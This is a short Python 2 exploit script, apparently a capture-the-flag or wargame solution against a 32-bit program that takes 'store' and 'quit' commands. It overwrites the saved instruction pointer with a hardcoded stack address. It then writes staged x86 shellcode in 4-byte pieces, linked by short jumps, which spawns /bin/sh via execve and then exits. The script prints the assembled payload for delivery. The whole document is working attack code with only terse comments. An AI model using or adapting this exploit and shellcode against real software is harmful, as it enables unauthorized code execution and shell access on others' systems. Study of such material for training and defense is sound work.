#!/usr/local/bin/python2
import struct

def p(x):
    return struct.pack("<I", x)

def up(x):
    return struct.unpack("<I", x)[0]

def store(index, number):

    cmd = ""
    cmd += "store\n"
    cmd += "%s\n" % number
    cmd += "%i\n" % index

    return cmd

def quit():

    cmd = ""
    cmd += "quit\n"

    return cmd

# We cannot write at the first index
DATA_BUF = 0xbffff5c8 + 4

JMP_4    = "\xeb\x04"

# Write shellcode. Each stage ends with jump + 4 to skip the 0 parts that we cant write to
stage1 = "\x31\xc0\x50\x90"
stage2 = "\x90\x90" + JMP_4
stage3 = "\x68\x2f\x2f\x73"
stage4 = "\x68\x90" + JMP_4
stage5 = "\x68\x2f\x62\x69"
stage6  = "\x6e\x90" + JMP_4
stage7  = "\x89\xe3\x89\xc1"
stage8  = "\x89\xc2" + JMP_4
stage9  = "\xb0\x0b\xcd\x80"
stage10 = "\x31\xc0" + JMP_4
stage11 = "\x40\xcd\x80" + "\x90"

payload = ""
payload += store(109, DATA_BUF) # Overwrite EIP

payload += store(1, up(stage1))
payload += store(2, up(stage2))
payload += store(4, up(stage3))
payload += store(5, up(stage4))
payload += store(7, up(stage5))
payload += store(8, up(stage6))
payload += store(10, up(stage7))
payload += store(11, up(stage8))
payload += store(13, up(stage9))
payload += store(14, up(stage10))
payload += store(16, up(stage11))

payload += quit() # Fire

print payload
